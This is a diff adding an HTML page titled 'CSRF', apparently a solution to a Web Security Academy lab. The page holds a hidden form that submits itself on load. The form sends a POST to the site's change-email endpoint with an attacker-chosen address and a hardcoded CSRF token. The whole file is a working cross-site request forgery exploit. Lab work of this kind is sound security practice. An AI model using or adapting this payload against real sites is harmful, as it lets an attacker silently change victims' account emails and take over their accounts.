@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <form method="POST" action="https://acc11f061fafa126c080d7f200fa000f.web-security-academy.net/my-account/change-email" style="visibility: hidden;">
+        <input value="new-email@email.com" name="email" />
+        <input value="f5yb6U7yaeMMhMPr6eFI5KrOljIE6VHH" name="csrf" />
+    </form>
+    <script>
+        //document.cookie = 'session=10';
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
